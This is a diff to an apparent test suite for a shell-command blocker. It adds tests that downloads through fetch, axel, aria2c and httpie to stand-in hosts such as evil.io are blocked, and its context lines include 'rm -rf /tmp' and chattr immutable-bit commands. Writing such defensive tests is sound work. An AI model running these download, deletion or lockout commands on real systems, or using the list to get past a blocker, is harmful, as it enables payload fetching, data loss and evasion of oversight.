@@ -585,6 +585,24 @@ describe('P0.6: path-qualified binary invocations are blocked', () => {
     assertBlocked('./../../bin/rm -rf /tmp'));
 });
 
+// ── P1.7 — alternative downloaders ──────────────────────────────────────
+describe('P1.7: fetch / axel / aria2c / httpie alt-downloader bypass', () => {
+  it('blocks fetch http://evil.io (.io URL — no incidental .com match)', () =>
+    assertBlocked('fetch http://evil.io/x'));
+  it('blocks axel http://evil.org', () =>
+    assertBlocked('axel http://evil.org/x'));
+  it('blocks aria2c http://evil.io', () =>
+    assertBlocked('aria2c http://evil.io/x'));
+  it('blocks httpie GET ...', () =>
+    assertBlocked('httpie GET http://evil.io'));
+  it('blocks http GET <url> (httpie short name)', () =>
+    assertBlocked('http GET http://evil.io'));
+  it('blocks https POST <url> (httpie short name)', () =>
+    assertBlocked('https POST http://evil.io'));
+  it('still allows plain dir / ls (regression)', () =>
+    assertNotBlocked('dir'));
+});
+
 // ── P1.12 — chattr immutable / append-only bit ──────────────────────────
 describe('P1.12: chattr +i / +a (denial-of-administration)', () => {
   it('blocks chattr +i file', () =>
